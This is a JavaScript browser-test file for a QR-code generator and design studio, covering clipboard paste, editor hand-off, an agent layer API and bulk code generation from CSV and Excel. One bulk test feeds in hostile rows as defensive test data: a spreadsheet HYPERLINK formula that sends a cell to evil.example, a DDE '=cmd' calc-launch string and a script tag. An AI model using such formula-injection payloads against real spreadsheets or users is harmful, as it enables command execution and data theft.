  const page = await tool(browser, base, h, 'desktop', { permissions: ['clipboard-read', 'clipboard-write'] });
  await page.click('button[data-preset="label-blue"]');
  await settled(page, 'ok');
  await page.click('#copy');
  const clip = await h.waitForAsync(page, async () => { const items = await navigator.clipboard.read(); const it = items[0]; if (!it || it.types.indexOf('text/html') < 0) return null; return { types: it.types, html: await (await it.getType('text/html')).text(), png: (await it.getType('image/png')).size }; });
  h.assert(clip.types.indexOf('image/png') >= 0 && clip.png > 2000 && /data-le-design=/.test(clip.html), 'a PNG and our layer: ' + clip.types.join(' '));
  const studio = await h.open(browser, base, '/studio/', 'desktop');
  await studio.waitForFunction(() => window.LEStudio && LEStudio.cmd);
  await studio.evaluate((html) => { const dt = new DataTransfer(); dt.setData('text/html', html); document.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); }, clip.html);
  await studio.waitForFunction(() => LEStudio.S.project && LEStudio.scene.toJSON().layers.some((l) => l.assetId === 'qr:code'), null, { timeout: 20000 });
  const got = await studio.evaluate(() => { const l = LEStudio.scene.toJSON().layers.find((x) => x.assetId === 'qr:code'); return { l: { w: l.w, h: l.h, svg: l.svg.length, name: l.name }, q: LEStudio.studio().qr[l.id] }; });
  h.assert(got.q.shape === 'rounded' && got.q.frame.style === 'label' && got.q.text === 'https://localeditor.net/' && got.l.h > got.l.w, 'the pasted element carries its whole look: ' + JSON.stringify(got).slice(0, 300));
  await studio.evaluate(() => { const dt = new DataTransfer(); dt.setData('text/html', '<img data-le-design="{&quot;qr&quot;:{&quot;text&quot;:&quot;&quot;}}"><img data-le-design="not json">'); document.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); });
  await studio.waitForTimeout(500);
  h.assert.equal(await studio.evaluate(() => LEStudio.scene.toJSON().layers.filter((l) => l.assetId === 'qr:code').length), 1, 'a broken clipboard layer adds nothing');
  h.assert.noErrors(studio);
};

cases['"Open in the editor" hands the code to the studio as an editable QR element; Edit QR has the same controls'] = async ({ browser, base, h }) => {
  const page = await tool(browser, base, h);
  const png = Buffer.from((await page.evaluate(PICTURE)).split(',')[1], 'base64');
  await page.click('button[data-preset="ember"]');
  await page.evaluate(() => { document.querySelector('[data-sec="picture"]').open = true; });
  await page.setInputFiles('[data-sec="picture"] label.qr-file >> nth=0 >> input', { name: 'logo.png', mimeType: 'image/png', buffer: png });
  await page.waitForFunction(() => !!LEQrPage.editor.spec().image);
  await settled(page, 'ok');
  await page.click('#studio');
  await page.waitForURL(/\/studio\/#d=|\/studio\/$/, { timeout: 20000 });
  await page.click('.sxd-sheet [data-yes]', { timeout: 30000 });
  await page.waitForFunction(() => window.LEStudio && LEStudio.S.project && LEStudio.scene.toJSON().layers.some((l) => l.assetId === 'qr:code'), null, { timeout: 20000 });
  let got = await page.evaluate(() => { const l = LEStudio.scene.toJSON().layers.find((x) => x.assetId === 'qr:code'); return { id: l.id, svg: l.svg, q: LEStudio.studio().qr[l.id] }; });
  h.assert(got.q.shape === 'connected' && got.q.eye.outerColor === '#c2410c' && got.q.image && /^data:image/.test(got.q.image.src) && /<image /.test(got.svg), 'the element has its spec and its picture: ' + JSON.stringify(got.q).slice(0, 240));
  await page.evaluate((id) => { LEStudio.scene.select([id]); LEStudio.cmd('editQr'); }, got.id);
  await page.waitForSelector('.sx-qr .qr-app[data-mode="studio"] .qr-preset');
  await page.waitForFunction(() => document.querySelector('.sx-qr .qr-status').getAttribute('data-state') === 'ok');
  h.assert.equal(await page.inputValue('.sx-qr select[data-k="dot-shape"]'), 'connected', 'the dialog opens on the element\'s own look');
  for (const sel of ['.qr-tabs button[data-t="wifi"]', '.qr-preset[data-preset="ocean"]', '[data-sec="style"]', '[data-sec="picture"] .qr-file', '[data-sec="frame"]', '[data-qr-many]']) h.assert((await page.locator('.sx-qr ' + sel).count()) >= 1, 'the dialog has ' + sel);
  await page.click('.sx-qr .qr-preset[data-preset="mint"]');
  await page.waitForFunction(() => document.querySelector('.sx-qr .qr-status').getAttribute('data-state') === 'ok');
  await page.click('.sx-qr [data-qr-go]');
  await page.waitForFunction(() => !document.querySelector('.sx-qr'));
  const after = await page.evaluate((id) => { const l = LEStudio.scene.toJSON().layers.find((x) => x.id === id); return { svg: l.svg, w: l.w, h: l.h, q: LEStudio.studio().qr[id] }; }, got.id);
  h.assert(after.q.frame.style === 'ticket' && after.q.shape === 'dots' && after.q.image && />Scan me<\/text>/.test(after.svg) && after.h > after.w, 'Update redraws the element and keeps the picture');
  h.assert.noErrors(page);
};

/* ---------- the studio's QR element ---------- */
cases['studio: a plain code is stored and drawn as before; a styled one survives save, reopen and the design file'] = async ({ browser, base, h }) => {
  const page = await h.open(browser, base, '/studio/', 'desktop');
  await page.waitForFunction(() => window.LEStudio && LEStudio.cmd);
  await page.evaluate(() => { LEStudio.cmd('addQr'); });
  await page.waitForSelector('.sx-qr .qr-fields input');
  await page.fill('.sx-qr .qr-fields input', 'https://example.com/plain');
  await page.waitForFunction(() => document.querySelector('.sx-qr .qr-status').getAttribute('data-state') === 'ok');
  await page.click('.sx-qr [data-qr-go]');
  await page.waitForFunction(() => LEStudio.scene.toJSON().layers.some((l) => l.assetId === 'qr:code'));
  const plain = await page.evaluate((src) => { const old = (0, eval)('(' + src + ')'); const l = LEStudio.scene.toJSON().layers.find((x) => x.assetId === 'qr:code'); const q = LEStudio.studio().qr[l.id]; return { id: l.id, same: LE.project.sanitizeSvg(old(q.text, q.fg, q.bg, q.ec)) === l.svg, keys: Object.keys(q).sort().join(), square: Math.abs(l.w - l.h) < 0.01 }; }, OLD_RENDERER);
  h.assert(plain.same && plain.keys === 'bg,ec,fg,text' && plain.square, 'a plain code is the old markup and the old four settings: ' + JSON.stringify(plain));
  /* an entry written by an older version, opened and updated without touching the look */
  await page.evaluate((id) => { LEStudio.studio().qr[id] = { text: 'https://example.com/old', fg: '#0b3d91', bg: null, ec: 'Q' }; LEStudio.scene.select([id]); LEStudio.cmd('editQr'); }, plain.id);
  await page.waitForFunction(() => { const e = document.querySelector('.sx-qr .qr-status'); return e && e.getAttribute('data-state') === 'ok'; });
  h.assert.equal(await page.inputValue('.sx-qr .qr-fields input'), 'https://example.com/old');
  await page.click('.sx-qr [data-qr-go]');
  await page.waitForFunction(() => !document.querySelector('.sx-qr'));
  const old = await page.evaluate((a) => { const f = (0, eval)('(' + a.src + ')'); const l = LEStudio.scene.toJSON().layers.find((x) => x.id === a.id); const q = LEStudio.studio().qr[a.id]; return { same: LE.project.sanitizeSvg(f('https://example.com/old', '#0b3d91', null, 'Q')) === l.svg, q }; }, { src: OLD_RENDERER, id: plain.id });
  h.assert(old.same && JSON.stringify(old.q) === JSON.stringify({ text: 'https://example.com/old', fg: '#0b3d91', bg: null, ec: 'Q' }), 'an old entry stays an old entry: ' + JSON.stringify(old.q));
  /* now style it */
  await page.evaluate((id) => { LEStudio.scene.select([id]); LEStudio.cmd('editQr'); }, plain.id);
  await page.waitForSelector('.sx-qr .qr-preset[data-preset="sunset"]');
  await page.click('.sx-qr .qr-preset[data-preset="sunset"]');
  await page.waitForFunction(() => document.querySelector('.sx-qr .qr-status').getAttribute('data-state') === 'ok');
  await page.click('.sx-qr [data-qr-go]');
  await page.waitForFunction(() => !document.querySelector('.sx-qr'));
  const out = await page.evaluate(async (id) => {
    const p = LEStudio.S.project, meta = JSON.parse(JSON.stringify(p.meta.studio.qr[id]));
    const safe = LE.project.validate ? LE.project.validate(JSON.parse(JSON.stringify(p))) : null;
    await LE.modules.need('design');
    const text = LE.design.stringify(p, { images: 'none' }).text, back = await LE.design.parse(text);
    const layer = JSON.parse(text).pages[0].layers.find((l) => l.qr);
    return { meta, kept: safe && safe.project ? safe.project.meta.studio.qr[id] : (safe && safe.meta ? safe.meta.studio.qr[id] : null), layer: layer.qr, hasSvg: !!layer.svg, back: back.ok && Object.values(back.project.meta.studio.qr)[0], errors: back.errors };
  }, plain.id);
  h.assert(out.meta.shape === 'rounded' && out.meta.fg.stops.length === 2 && out.meta.eye.inner === 'dot' && out.meta.radius === 0.06, 'the stored entry is the style spec: ' + JSON.stringify(out.meta));
  const canon = (o) => JSON.stringify(o, (k, v) => (v && typeof v === 'object' && !Array.isArray(v) ? Object.keys(v).sort().reduce((a, x) => { a[x] = v[x]; return a; }, {}) : v));
  h.assert(out.kept && canon(out.kept) === canon(out.meta), 'the project gate keeps the look: ' + JSON.stringify(out.kept));
  h.assert(out.hasSvg && canon(out.layer) === canon(out.meta) && out.back && canon(out.back) === canon(out.meta), 'the design file round-trips it: ' + JSON.stringify(out.errors || out.back));
  h.assert.noErrors(page);
};

cases['agents and designs: a layer with "qr" settings alone is drawn by the engine; makers take a QR look'] = async ({ browser, base, h }) => {
  const page = await h.open(browser, base, '/studio/', 'desktop');
  await h.need(page, ['agentui', 'makers', 'design']);
  await page.waitForFunction(() => window.LEAgent && window.LEStudio && LEAgent._internal.A.ready);
  const begun = page.evaluate(() => LEAgent.begin({ name: 'Test agent', task: 'QR codes' }));
  await page.click('.sxa-ask [data-yes]');
  h.assert((await begun).ok, 'session');
  await page.evaluate(() => LEAgent._person.setSpeed('instant'));
  let r = await page.evaluate(() => LEAgent.apply([{ op: 'add', layer: { id: 'menu-qr', type: 'svg', x: 100, y: 100, w: 400, qr: { text: 'https://example.com/menu', shape: 'dots', fg: { type: 'linear', angle: 45, stops: ['#9f1239', '#c2410c'] }, bg: '#fff8f1', eye: { outer: 'rounded', inner: 'dot' }, frame: { style: 'label', text: 'Menu' }, onclick: 'x' } } },
    { op: 'add', layer: { id: 'plain-qr', type: 'svg', x: 600, y: 100, w: 200, qr: { text: 'hello' } } }]));
  h.assert(r.ok, 'the add op takes a style spec: ' + JSON.stringify(r).slice(0, 300));
  const got = await page.evaluate(() => { const ls = LEStudio.scene.toJSON().layers, a = ls.find((l) => l.id === 'menu-qr'), b = ls.find((l) => l.id === 'plain-qr'), st = LEStudio.studio().qr; return { a: { asset: a.assetId, h: a.h, w: a.w, text: />Menu<\/text>/.test(a.svg), grad: /<linearGradient/.test(a.svg) }, qa: st['menu-qr'], b: { asset: b.assetId, crisp: /crispEdges/.test(b.svg), h: b.h }, qb: st['plain-qr'] }; });
  h.assert(got.a.asset === 'qr:code' && got.a.text && got.a.grad && got.a.h > got.a.w && got.qa.frame.text === 'Menu' && got.qa.fg.stops[1].at === 1 && !('onclick' in got.qa), 'styled layer: ' + JSON.stringify(got.a) + JSON.stringify(got.qa).slice(0, 200));
  h.assert(got.b.crisp && got.b.h === 200 && JSON.stringify(got.qb) === JSON.stringify({ text: 'hello', fg: '#17131f', bg: '#ffffff', ec: 'M' }), 'a bare { text } is a plain code: ' + JSON.stringify(got.qb));
  r = await page.evaluate(() => LEAgent.apply([{ op: 'add', layer: { id: 'pale', type: 'svg', x: 0, y: 0, w: 100, qr: { text: 'x', shape: 'dots', fg: '#f2d9a0', bg: '#fff7e0' } } }]));
  h.assert(JSON.stringify(r).indexOf('qr-contrast') > 0, 'a pale code comes back with a warning: ' + JSON.stringify(r).slice(0, 400));
  r = await page.evaluate(() => LEAgent.apply([{ op: 'add', layer: { id: 'none', type: 'svg', x: 0, y: 0, w: 100 } }]));
  h.assert(!r.ok, 'an svg layer with nothing in it is still refused');
  /* makers */
  await page.addScriptTag({ url: base + '/assets/vendor/jsqr.js' });
  const mk = await page.evaluate(async () => {
    await LE.makers.ready();
    const values = { ssid: 'Corner Café', password: 'flatwhite2026', security: 'WPA' }, want = LE.makers.wifiPayload(values);
    const read = async (res) => { const c = await LE.makers.renderPage(res.pages[0], { maxEdge: 1400 }); const d = c.getContext('2d').getImageData(0, 0, c.width, c.height); const q = window.jsQR(d.data, c.width, c.height); return q && q.data; };
    const plain = await LE.makers.build('wifisign', values, {}), styled = await LE.makers.build('wifisign', values, { qrStyle: 'ocean' }), spec = await LE.makers.build('wifisign', values, { qrStyle: { shape: 'dots', fg: '#14532d', eye: { outer: 'circle', inner: 'dot' } } });
    const svgOf = (res) => res.pages[0].layers.find((l) => l.id === 'qr').svg;
    return { want, plain: /crispEdges/.test(svgOf(plain)), styled: /<linearGradient/.test(svgOf(styled)), spec: /stroke-linecap="round"/.test(svgOf(spec)), r1: await read(plain), r2: await read(styled), r3: await read(spec) };
  });
  h.assert(mk.plain && mk.styled && mk.spec, 'makers draw plain by default and styled on request: ' + JSON.stringify(mk));
  h.assert(mk.r1 === mk.want && mk.r2 === mk.want && mk.r3 === mk.want, 'all three scan to the same Wi-Fi string');
  h.assert.noErrors(page);
};

/* ---------- Make many ---------- */
cases['make many: 200 pasted rows become a zip with the right names, and every 20th code decodes to its row'] = async ({ browser, base, h }) => {
  const page = await tool(browser, base, h);
  await page.click('button[data-preset="forest"]');
  await settled(page, 'ok');
  await page.click('#manyBtn');
  const rows = ['table\tlink\tfile'];
  for (let i = 1; i <= 200; i++) rows.push('Table ' + i + '\thttps://example.com/t/' + i + '?ref=menu\tTable ' + (i % 50 === 0 ? 'Fifty' : i));
  await setValue(page, '.qr-bulk textarea', rows.join('\n'));
  await page.waitForSelector('.qr-bulk [data-go]');
  h.assert(/200 rows are ready/.test(await page.textContent('.qr-bulk-sum')), await page.textContent('.qr-bulk-sum'));
  h.assert.equal(await page.inputValue('.qr-bulk-map select >> nth=1'), '1', 'the link column is found by its name');
  await page.selectOption('.qr-bulk-map select >> nth=2', '0');
  await page.selectOption('.qr-bulk-map select >> nth=3', '2');
  await page.selectOption('.qr-bulk-out select', '512');
  const r = await h.capture(page, () => page.click('.qr-bulk [data-go]'), 120000);
  const files = unzip(r.buf), names = Object.keys(files);
  h.assert(r.name === 'qr-codes.zip' && names.length === 200, 'two hundred files: ' + names.length);
  h.assert(files['table-1.png'] && files['table-199.png'] && files['table-fifty.png'] && files['table-fifty-2.png'] && files['table-fifty-4.png'], 'names from the chosen column, repeats numbered: ' + names.slice(0, 5).join(' '));
  for (let i = 20; i <= 200; i += 20) {
    const name = i % 50 === 0 ? 'table-fifty' + (i === 50 ? '' : '-' + i / 50) + '.png' : 'table-' + i + '.png';
    h.assert.equal(await readPng(page, files[name]), 'https://example.com/t/' + i + '?ref=menu', name);
  }
  const one = h.imageInfo(files['table-1.png']);
  h.assert(one.w === 512 && one.h > 512, 'the label is printed under the code: ' + JSON.stringify(one));
  h.assert(/200 codes made/.test(await page.textContent('.qr-bulk-sum')), await page.textContent('.qr-bulk-sum'));
  h.assert.noErrors(page);
};

cases['make many: hostile and broken rows are reported and left out, fixed in place, never run'] = async ({ browser, base, h }) => {
  const page = await tool(browser, base, h);
  const urls = [];
  page.on('request', (q) => urls.push(q.url()));
  await page.click('#manyBtn');
  const formula = '=HYPERLINK("https://evil.example/?x="&A1,"x")' + 'A'.repeat(5000);
  const csv = 'name,link\nGood,https://example.com/good\nFormula,"' + formula.replace(/"/g, '""') + '"\nEmpty,\nCmd,"=cmd|\' /C calc\'!A0"\nScript,"<script>window.__ran=1</script>"\n';
  await setValue(page, '.qr-bulk textarea', csv);
  await page.waitForSelector('.qr-bulk [data-go]');
  await page.selectOption('.qr-bulk-map select >> nth=0', 'text');
  await page.waitForFunction(() => /3 rows are ready/.test(document.querySelector('.qr-bulk-sum').textContent));
  const sum = await page.textContent('.qr-bulk-sum');
  h.assert(/2 left out/.test(sum) && /shortened/.test(sum), 'two rows are left out and the long cell is reported: ' + sum);
  const bad = await page.locator('.qr-bulk-bad li').allTextContents();
  h.assert(bad.length === 2 && /Row 2/.test(bad[0]) && /characters/.test(bad[0]) && /Row 3/.test(bad[1]), 'the list says which and why: ' + bad.join(' | ').slice(0, 200));
  await page.click('.qr-bulk-bad li[data-row="3"] [data-fix]');
  await page.fill('.qr-bulk-bad li[data-row="3"] input', 'now it has text');
  await page.press('.qr-bulk-bad li[data-row="3"] input', 'Tab');
  await page.waitForFunction(() => /4 rows are ready/.test(document.querySelector('.qr-bulk-sum').textContent));
  await page.click('.qr-bulk-out .qr-seg button[data-v="svg"]');
  const r = await h.capture(page, () => page.click('.qr-bulk [data-go]'), 60000);
  const files = unzip(r.buf), names = Object.keys(files).sort();
  h.assert.equal(names.length, 4, names.join(' '));
  h.assert(names.every((n) => /^[a-z0-9-]+\.svg$/.test(n)), 'file names are plain: ' + names.join(' '));
  h.assert(names.every((n) => { const s = files[n].toString(); return /^<svg /.test(s) && !/<script|onload|javascript:/i.test(s); }), 'the SVG files hold no script');
  const state = await page.evaluate(() => ({ ran: window.__ran, texts: LEQrPage.bulk().state().items.filter((i) => !i.error).map((i) => i.text) }));
  h.assert(state.ran === undefined && state.texts.indexOf('=cmd|\' /C calc\'!A0') >= 0 && state.texts.indexOf('<script>window.__ran=1</script>') >= 0, 'formula and markup text is only ever text inside a code');
  h.assert(urls.every((u) => u.indexOf(base) === 0 || /^(data|blob):/.test(u)), 'no request left the device: ' + urls.filter((u) => u.indexOf(base) !== 0).join(' '));
  h.assert.noErrors(page);
};

cases['make many: an Excel file with two sheets, field columns for Wi-Fi, and a PDF sheet with pause and cancel'] = async ({ browser, base, h }) => {
  const page = await tool(browser, base, h);
  await page.addScriptTag({ url: base + '/assets/vendor/xlsx.full.min.js' });
  const b64 = await page.evaluate(() => {
    const wb = XLSX.utils.book_new();
    const a = XLSX.utils.aoa_to_sheet([['Room', 'Network', 'Password'], ['Lobby', 'Hotel Lobby', 'welcome2026'], ['Pool', 'Hotel;Pool', 'splash:"1"'], ['Roof', 'Hotel Roof', '']]);
    a.D2 = { t: 'n', f: 'SUM(1,2)', v: 3 }; a['!ref'] = 'A1:D4';
    XLSX.utils.book_append_sheet(wb, a, 'Wi-Fi');
    const rows = [['Seat', 'Link']];
    for (let i = 1; i <= 120; i++) rows.push(['Seat ' + i, 'https://example.com/seat/' + i]);
    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(rows), 'Seats');
    return XLSX.write(wb, { type: 'base64', bookType: 'xlsx' });
  });
  await page.click('#manyBtn');
  await page.setInputFiles('.qr-bulk input[type=file]', { name: 'hotel.xlsx', mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', buffer: Buffer.from(b64, 'base64') });
  await page.waitForSelector('.qr-bulk [data-sheets]:not([hidden])');
  h.assert.equal((await page.locator('.qr-bulk [data-sheets] option').allTextContents()).join(), 'Wi-Fi,Seats', 'the sheet picker lists both sheets');
  await page.selectOption('.qr-bulk-map select >> nth=0', 'wifi');
  await page.waitForFunction(() => /2 rows are ready/.test(document.querySelector('.qr-bulk-sum').textContent));
  const st = await page.evaluate(() => { const s = LEQrPage.bulk().state(); return { map: s.map.fields, cell: s.table.rows[0][3], items: s.items.map((i) => [i.text, i.error, i.name]) }; });
  h.assert.equal(st.cell, '3', 'a formula cell arrives as its stored value, as text');
  h.assert(st.map.ssid === 1 && st.map.password === 2, 'Wi-Fi fields find their columns: ' + JSON.stringify(st.map));
  h.assert.equal(st.items[0][0], 'WIFI:T:WPA;S:Hotel Lobby;P:welcome2026;;');
  h.assert.equal(st.items[1][0], 'WIFI:T:WPA;S:Hotel\\;Pool;P:splash\\:\\"1\\";;');
  h.assert(st.items[2][1] && st.items[0][2] === 'wifi-hotel-lobby', 'a network without its password is left out: ' + JSON.stringify(st.items[2]));
  await page.selectOption('.qr-bulk [data-sheets] select', 'Seats');
  await page.waitForFunction(() => { const s = LEQrPage.bulk().state(); return s.table.sheet === 'Seats' && s.items.length === 120; });
  await page.selectOption('.qr-bulk-map select >> nth=0', 'link');
  await page.waitForFunction(() => /120 rows are ready/.test(document.querySelector('.qr-bulk-sum').textContent));
  await page.selectOption('.qr-bulk-map select >> nth=2', '0');
  await page.click('.qr-bulk-out .qr-seg button[data-v="pdf"]');
  await page.selectOption('.qr-bulk-out select >> nth=1', '4');
  /* pause holds the work, resume carries on */
  const got = h.capture(page, () => page.click('.qr-bulk [data-go]'), 120000);
  await page.waitForSelector('.qr-bulk-run:not([hidden])');
  await page.click('.qr-bulk-run [data-pause]');
  await page.waitForTimeout(400);
  const a = await page.evaluate(() => document.querySelector('.qr-bulk-run progress').value);
  await page.waitForTimeout(900);
  const b = await page.evaluate(() => document.querySelector('.qr-bulk-run progress').value);
  h.assert(b - a <= 1 && b < 120, 'paused: ' + a + ' → ' + b);
  await page.click('.qr-bulk-run [data-pause]');
  const r = await got;
  const pdf = await h.pdfRead(browser, base, r.buf);
  h.assert(r.name === 'qr-codes.pdf' && pdf.sizes.length === 6 && Math.round(pdf.sizes[0][0]) === 595, '120 labelled codes, 4 across, 20 to an A4 page: ' + JSON.stringify(pdf.sizes));
  /* cancel saves nothing */
  await page.waitForSelector('.qr-bulk [data-go]');
  h.assert(await none(page, async () => { await page.click('.qr-bulk [data-go]'); await page.click('.qr-bulk-run [data-stop]'); await page.waitForFunction(() => /Cancelled/.test(document.querySelector('.qr-bulk-sum').textContent)); }), 'cancel downloads nothing');
  h.assert((await page.evaluate(() => LEQrPage.bulk().cap())) >= 500, 'row cap comes from LE.variables');
  h.assert.noErrors(page);
};

module.exports = cases;
